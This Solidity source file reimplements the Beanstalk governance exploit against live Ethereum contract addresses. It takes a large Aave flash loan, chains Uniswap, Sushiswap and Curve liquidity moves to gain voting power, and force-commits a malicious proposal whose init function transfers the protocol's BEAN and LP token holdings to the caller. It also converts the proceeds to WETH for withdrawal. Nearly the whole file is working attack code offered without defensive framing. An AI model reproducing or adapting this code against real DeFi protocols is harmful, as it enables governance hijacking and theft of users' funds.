// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IBeanStalk.sol";
import "./ICurve.sol";
import "./IUniswapV2pair.sol";
import "./IUniswapV3pool.sol";
import "./IFlashLoanReceiver.sol";
import "./console.sol";

library token_amout{

    uint256 constant DAI_AMOUNT = 350000000 * 10**18;
    uint256 constant USDC_AMOUNT = 500000000 * 10**6;
    uint256 constant USDT_AMOUNT = 150000000 * 10**6;
    uint256 constant BEAN_AMOUNT = 32100950626687;
    uint256 constant LUSD_AMOUNT = 11643065703498478902362927;
    uint256 constant LUSD_EXCHANGE_AMOUNT = 15000000 * 10**18;
    uint256 constant CRV_TOKENS = 964691328662155074401448409;
    uint256 constant BEANCRV_F_AMOUNT = 795425740813818200295323741;
    uint256 constant BEANLUSD_F_AMOUNT = 58924887872471876761750555;
    uint256 constant UNI_LP_TOKEN_AMOUNT = 540716100968756904;

}

contract hack_bean{
    
    address public constant Aave_lendingpool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    // address public constant Aave_lendingPool = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;

    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;               //350,000,000 from aave Protocol V2, to UNI-V3-swap
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;              //500,000,000 from aave  Protocol V2, to UNI-V3-swap
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;              //150,000,000 from aave  Protocol V2, to UNI-V3-swap
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;              //11600000, from Sushiswap
    address public constant BEAN = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;              //32000000, from Uniswap v2
    address public constant OHM = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;               //

    address public constant CRV_3 = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;             //curve lp token

    address public constant WETH_BEAN = 0x87898263B6C5BABe34b4ec53F22d98430b91e371;             //32000000 BEAN     // Uniswap v2
    address public constant WETH_LUSD = 0x279Ca79d5fb2490721512C8Ae4767E249D75F41B;             //11600000 LUSD     // Sushiswap

    address public constant DAI_USDC = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168;              // Uniswap v3
    address public constant USDC_WETH = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640;             // Uniswap v3
    address public constant USDT_WETH = 0x4e68Ccd3E89f51C3074ca5072bbAC773960dFa36;             // Uniswap v3
    address public constant OHM_LUSD = 0x46E4D8A1322B9448905225E52F914094dBd6dDdF;              // sushiSwap
    address public constant CRV_3_pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;            // curve DAI_USDT_USDC ´ú±Ò³Ø


    address public constant SUSHI_router = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;          //swap
    address public constant UNI_V2_router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;         //swap
    address public constant UNI_V3_router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;         //swap

    // address public constant Curve_address = ;

    address public constant BEAN3CRV_f = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;                //add_liquidity
    address public constant BEAN3LUSD_f = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D;               //add_liquidity
    address public constant LUSD3CRV_f = 0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA;                //swap LUSD

    address public constant BEAN_Governance = 0xf480eE81a54E21Be47aa02D0F9E29985Bc7667c4;           //bip
    address public constant Beanstalk_protocol = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;        //deposit
    // address public constant SiloV2Facet = 0x23D231f37c8F5711468C8AbbFbf1757d1f38FDA2;               //deposit

    // hacker info
    address public constant hacker = 0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4;
    address public constant hackerContract = 0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4;

    function set_all_approve() public {

        console.log("tokens starts approving...");
        IERC20(USDC).approve(CRV_3_pool, type(uint).max);
        // console.log("1xxx.");
        IUSDT(USDT).approve(CRV_3_pool, type(uint).max);
        IERC20(DAI).approve(CRV_3_pool, type(uint).max);
        IERC20(CRV_3).approve(LUSD3CRV_f, type(uint).max);
        IERC20(CRV_3).approve(BEAN3CRV_f, type(uint).max);
        IERC20(CRV_3).approve(CRV_3_pool, type(uint).max);
        IERC20(BEAN).approve(BEAN3LUSD_f, type(uint).max);
        IERC20(LUSD).approve(BEAN3LUSD_f, type(uint).max);
        IERC20(LUSD).approve(LUSD3CRV_f, type(uint).max);
        IERC20(BEAN3CRV_f).approve(Beanstalk_protocol, type(uint).max);
        IERC20(BEAN3LUSD_f).approve(Beanstalk_protocol, type(uint).max);
        IERC20(LUSD3CRV_f).approve(Beanstalk_protocol, type(uint).max);

        console.log("tokens are all approved...");
    }

    
    // function propose_a_bip(address _addr) public{
    //     IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
    //     bytes memory _calldata = bytes("bip");
    //     IBeanStalk(Beanstalk_protocol).propose(_diamondCut, _addr, _calldata, 1);
    // }

    function start_hack() public{
        console.log("start hacking...");
        borrow_from_aave();

    }


    function borrow_from_aave() internal{
        // flashloan from Aave
        IERC20(USDC).approve(Aave_lendingpool, type(uint).max);
        IUSDT(USDT).approve(Aave_lendingpool, type(uint).max);
        IERC20(DAI).approve(Aave_lendingpool, type(uint).max);
        console.log("Aave_lendingpool approved...");

        uint256 DAI_amount = 350000000 * 10 ** 18;
        uint256 USDC_amount = 500000000 * 10 ** 6;
        uint256 USDT_amount = 150000000 * 10 ** 6;
        address[] memory assets = new address[](3);
        assets[0] = DAI;
        assets[1] = USDC;
        assets[2] = USDT;
        
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = DAI_amount;
        amounts[1] = USDC_amount;
        amounts[2] = USDT_amount;

        uint256[] memory modes = new uint256[](3);
        modes[0] = 0;
        modes[1] = 0;
        modes[2] = 0;

        bytes memory params = "";

        ILendingPoolV2(Aave_lendingpool).flashLoan(address(this), assets, amounts, modes, address(this), params, 0);

    }

    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address initiator, bytes calldata params) external returns (bool){
        
        console.log("Borrow from Aave...");
        // uint256 my_DAI = IERC20(DAI).balanceOf(address(this));
        // uint256 my_USDC = IERC20(USDC).balanceOf(address(this));
        // uint256 my_USDT = IERC20(USDT).balanceOf(address(this));
        // console.log("I have DAI-USDC-USDT: ", my_DAI, my_USDC, my_USDT);
        
        swap_bean_from_uniV2();

        //swap LUSD from LUSD3CRV_f to get CEV_3
        ICurve(LUSD3CRV_f).exchange(0, 1, 16471404984641022902557141, 0);

        //removeliquidity of CRV_3 to get DAI/USDC/USDT
        ICurve(CRV_3_pool).remove_liquidity_one_coin(511959710180617886302214702, 1, 0);       //USDC
        ICurve(CRV_3_pool).remove_liquidity_one_coin(358371797126432520411550291, 0, 0);       //DAI
        ICurve(CRV_3_pool).remove_liquidity_one_coin(153587913054185365890664411, 2, 0);       //USDT

        return_Aave_flashloan();
        return true;
    }

    function return_Aave_flashloan() view internal{
        uint256 last_DAI_amount = IERC20(DAI).balanceOf(address(this));
        uint256 last_USDT_amount = IERC20(USDC).balanceOf(address(this));
        uint256 last_USDC_amount = IERC20(USDT).balanceOf(address(this));

        console.log("last I have got DAI-USDC-USDT: ", last_DAI_amount, last_USDC_amount, last_USDT_amount);
    }

    function swap_bean_from_uniV2() internal{

        console.log("swap_bean_from_uniV2...");

        IERC20(BEAN).approve(UNI_V2_router, type(uint).max);

        // WETH - BEAN
        uint256 bean_outamount = 32100950.626687 * 10**6;
        bytes memory data = abi.encode(uint256(100));

        IERC20(WETH).approve(UNI_V2_router, type(uint).max);
        // (uint112 reserve0, uint112 reserve1,) = UniswapV2Pair(WETH_BEAN).getReserves();
        // console.log("reserve0_WETH: ",reserve0,"... reserve0_BEAN: ", reserve1);

        UniswapV2Pair(WETH_BEAN).swap(uint(0), bean_outamount, address(this), data);
    }

    function uniswapV2Call(address _account, uint256 _amount0, uint256 _amount1, bytes memory _data) external {
        uint256 selector = abi.decode(_data, (uint256));

        if(selector == 100){
            uint256 return_BEAN_amount = (_amount1 * 1000)/997 + 1;
            console.log("I got bean token from uniswapV2...", IERC20(BEAN).balanceOf(address(this)));

            swap_lusd_from_sushi();
            IERC20(BEAN).transfer(WETH_BEAN, return_BEAN_amount);
            console.log("BEAN has returned to uniswapV2...");

        }else if(selector == 200){
            uint256 return_LUSD_amount = (_amount0 * 1000)/997 + 1;
            console.log("I got lusd token from sushiswap...", IERC20(LUSD).balanceOf(address(this)));

            add_liquidity_to_curve();
            IERC20(LUSD).transfer(OHM_LUSD, return_LUSD_amount);
            console.log("LUSD has returned to sushiswap...");
        }
    }

    function swap_lusd_from_sushi() internal{
        console.log("swap_lusd_from_sushi...");
        IERC20(LUSD).approve(SUSHI_router, type(uint).max);

        // LUSD - OHM
        uint256 lusd_amount = 11643065703498478902362927;
        bytes memory data = abi.encode(uint256(200));

        IERC20(OHM).approve(SUSHI_router, type(uint).max);
        UniswapV2Pair(OHM_LUSD).swap(lusd_amount, uint(0), address(this), data);
    }


    function add_liquidity_to_curve() internal{

        console.log("add_liquidity_to_curve...");
        // DAI , USDT , USDC  add liquidity and get CRV_3
        uint256 DAI_amount = 350000000 * 10 ** 18;
        uint256 USDC_amount = 500000000 * 10 ** 6;
        uint256 USDT_amount = 150000000 * 10 ** 6;

        // uint256[] memory _amounts1 = new uint256[](3);
        // _amounts1[0] = DAI_amount;
        // _amounts1[1] = USDC_amount;
        // _amounts1[2] = USDT_amount;

        ICurve(CRV_3_pool).add_liquidity([DAI_amount, USDC_amount, USDT_amount], 0);
        console.log("add DAI-USDT-USDC, CRV_3 liquidity added, got CRV_3: ", IERC20(CRV_3).balanceOf(address(this)));

        // CRV_3 swap LUSD from LUSD3CRV_f
        uint256 _amount_CRV3 = 15000000 * 10**18;
        uint256 LUSD_returned = ICurve(LUSD3CRV_f).exchange(1, 0, _amount_CRV3, ICurve(LUSD3CRV_f).get_dy(0, 1, _amount_CRV3));
        console.log("use 15 million CRV_3 to swap LUSD: ", IERC20(LUSD).balanceOf(address(this)), " and remain CRV_3: ", IERC20(CRV_3).balanceOf(address(this)));

        // add CRV_3  to BEAN3CRV_f, get BEAN3CRV_f
        uint256 _amount_remain_CRV3 = 964691328662155074401448409;
        // uint256[] memory _amounts2 = new uint256[](2);
        // _amounts2[0] = 0;                   //BEAN
        // _amounts2[1] = _amount_remain_CRV3; //CRV_3

        ICurve(BEAN3CRV_f).add_liquidity([0, _amount_remain_CRV3], 636647182340103460666028018);
        console.log("add CRV_3, BEAN3CRV_f liquidity added, got BEAN3CRV_f: ", IERC20(BEAN3CRV_f).balanceOf(address(this)));

        // add BEAN and LUSD to BEAN3LUSD_f to get BEAN3LUSD_f
        uint256 _amount_BEAN = 32100950626687;
        uint256 _amount_LUSD = LUSD_returned + 11643065703498478902362927;
        // uint256[] memory _amounts3 = new uint256[](2);
        // _amounts3[0] = _amount_BEAN;                   //BEAN
        // _amounts3[1] = _amount_LUSD;                    //LUSD

        ICurve(BEAN3LUSD_f).add_liquidity([_amount_BEAN, _amount_LUSD], 47145751087025638235047870);
        console.log("add BEAN and LUSD, BEAN3LUSD_f liquidity added, got BEAN3LUSD_f: ", IERC20(BEAN3LUSD_f).balanceOf(address(this)));

        //vote and commit
        vote_and_commit();
    }

    function vote_and_commit() internal{
        //deposit
        uint256 BEAN3CRV_f_amount = 795425740813818200295323741;
        uint256 BEAN3LUSD_f_amount = 58924887872471876761750555;


        IBeanStalk(Beanstalk_protocol).deposit(BEAN3LUSD_f, BEAN3LUSD_f_amount);
        console.log("deposit BEAN3LUSD_f done...");
        IBeanStalk(Beanstalk_protocol).deposit(BEAN3CRV_f, BEAN3CRV_f_amount);
        console.log("deposit BEAN3CRV_f done...get vote power!!!");
        
        // uint32[] memory bip_num = GovernanceFacet(BEAN_Governance).activeBips();
        // console.log("there are bips: ", bip_num[18]);
        //vote
        IBeanStalk(Beanstalk_protocol).vote(20);
        console.log("voted 20...");

        // //commit
        IBeanStalk(Beanstalk_protocol).emergencyCommit(20);
        console.log("emergencyCommited 20...");
        ///////////////////////////////////////////////////// get BEAN , WETH_BEAN, BEAN3CRV_f , BEAN3LUSD_f
        console.log("We have got BEAN , WETH_BEAN,", IERC20(BEAN).balanceOf(address(this)), IERC20(WETH_BEAN).balanceOf(address(this)));
        console.log("and BEAN3CRV_f , BEAN3LUSD_f !!!!!!", IERC20(BEAN3CRV_f).balanceOf(address(this)),IERC20(BEAN3LUSD_f).balanceOf(address(this)));
        // remove all liquidity
        removelquidity_all_token();
    }


    function removelquidity_all_token() internal{

        // BEAN3CRV_f amount = IERC20(BEAN3CRV_f).balanceOf(address(this)) to get CRV_3(1)
        ICurve(BEAN3CRV_f).remove_liquidity_one_coin(IERC20(BEAN3CRV_f).balanceOf(address(this)), 1, 0);
        console.log("remove liquidity of BEAN3CRV_f, get CRV_3: ", IERC20(CRV_3).balanceOf(address(this)));

        // BEAN3LUSD_f amount = IERC20(BEAN3LUSD_f).balanceOf(address(this)) to get LUSD(1)
        ICurve(BEAN3LUSD_f).remove_liquidity_one_coin(IERC20(BEAN3LUSD_f).balanceOf(address(this)), 1, 0);
        console.log("remove liquidity of BEAN3LUSD_f, get LUSD: ", IERC20(LUSD).balanceOf(address(this)));

    }


    function swap_all_token_to_WETH() public{
        console.log("start to swap all tokens to WETH...");
        IERC20(DAI).approve(UNI_V3_router, type(uint).max);
        IERC20(USDC).approve(UNI_V3_router, type(uint).max);
        IUSDT(USDT).approve(UNI_V3_router, type(uint).max);
        bytes memory _data = "";

        IUniswapV3Pool(DAI_USDC).swap(address(this), true, int(IERC20(DAI).balanceOf(address(this))), 4295128740, _data);
        IUniswapV3Pool(USDC_WETH).swap(address(this), true, int(IERC20(USDC).balanceOf(address(this))), 4295128740, _data);
        IUniswapV3Pool(USDT_WETH).swap(address(this), false, int(IERC20(USDT).balanceOf(address(this))), 1461446703485210103287273052203988822378723970341, _data);
        console.log("swap WETH done...");
    }

    function withdraw_all_weth() public {
        IERC20(WETH).transfer(msg.sender, IERC20(WETH).balanceOf(address(this)));
    }

    function get_balance_WETH() public view returns(uint256) {
        console.log("my balance is: ", IERC20(WETH).balanceOf(address(this)));
        return IERC20(WETH).balanceOf(address(this));
    }

    receive() external payable {}
}


contract Bip18{
    address public constant BEAN = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;
    address public constant BEAN3CRV_f = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
    address public constant BEAN3LUSD_f = 0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D;
    address public constant WETH_BEAN = 0x87898263B6C5BABe34b4ec53F22d98430b91e371;
    address public constant Beanstalk_protocol = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;

    function init() external{
        console.log("Bip20 init............");
        uint256 bean_balance = IERC20(BEAN).balanceOf(Beanstalk_protocol);
        uint256 BEAN3CRV_f_balance = IERC20(BEAN3CRV_f).balanceOf(Beanstalk_protocol);
        uint256 BEAN3LUSD_f_balance = IERC20(BEAN3LUSD_f).balanceOf(Beanstalk_protocol);
        uint256 WETH_BEAN_balance = IERC20(WETH_BEAN).balanceOf(Beanstalk_protocol);
        // console.log("remaining balance : ", bean_balance, BEAN3CRV_f_balance, BEAN3LUSD_f_balance);

        if(bean_balance > 0){
            IERC20(BEAN).transfer(msg.sender, bean_balance);
            // console.log("BIP18 transfer BEAN....");
        }
        if(BEAN3CRV_f_balance > 0){
            IERC20(BEAN3CRV_f).transfer(msg.sender, BEAN3CRV_f_balance);
            // console.log("BIP18 transfer BEAN3CRV_f....");
        }
        if(BEAN3LUSD_f_balance > 0){
            IERC20(BEAN3LUSD_f).transfer(msg.sender, BEAN3LUSD_f_balance);
            // console.log("BIP18 transfer BEAN3LUSD_f....");
        }
        if(WETH_BEAN_balance > 0){
            IERC20(WETH_BEAN).transfer(msg.sender, WETH_BEAN_balance);
            // console.log("BIP18 transfer WETH_BEAN....");
        }
        console.log("Bip20 done............");

        // uint256 bean_balance_remain = IERC20(BEAN).balanceOf(Beanstalk_protocol);
        // uint256 BEAN3CRV_f_balance_remain = IERC20(BEAN3CRV_f).balanceOf(Beanstalk_protocol);
        // uint256 BEAN3LUSD_f_balance_remain = IERC20(BEAN3LUSD_f).balanceOf(Beanstalk_protocol);
        // uint256 WETH_BEAN_balance_remain = IERC20(WETH_BEAN).balanceOf(Beanstalk_protocol);
        // console.log("Beanstalk_protocol remaining balance : ", bean_balance_remain, BEAN3CRV_f_balance_remain, BEAN3LUSD_f_balance_remain);
    }

}


contract hack_voter{
    address public constant UNI_V2_router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;         //swap
    address public constant WETH_BEAN = 0x87898263B6C5BABe34b4ec53F22d98430b91e371;             //32000000 BEAN     // Uniswap v2
    address public constant BEAN = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db;              //32000000, from Uniswap v2
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant Beanstalk_protocol = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;        //deposit

    function swap_bean_for_propose() public payable{
        IERC20(BEAN).approve(UNI_V2_router, type(uint).max);
        IERC20(WETH).approve(UNI_V2_router, type(uint).max);
        //swap eth for beans to propose
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = BEAN;
        UniswapV2Pair(UNI_V2_router).swapExactETHForTokens{value: msg.value}(0, path, address(this), block.timestamp + 60);
        console.log("get bean from uniswap: ", IERC20(BEAN).balanceOf(address(this)), "to deploy a bip");
        
    }

    function deposit_beans() public{
        //depositBeans
        uint256 amount = IERC20(BEAN).balanceOf(address(this));
        IBeanStalk(Beanstalk_protocol).depositBeans(amount);
        console.log("deposit bean to put forward a bip.");
    }
}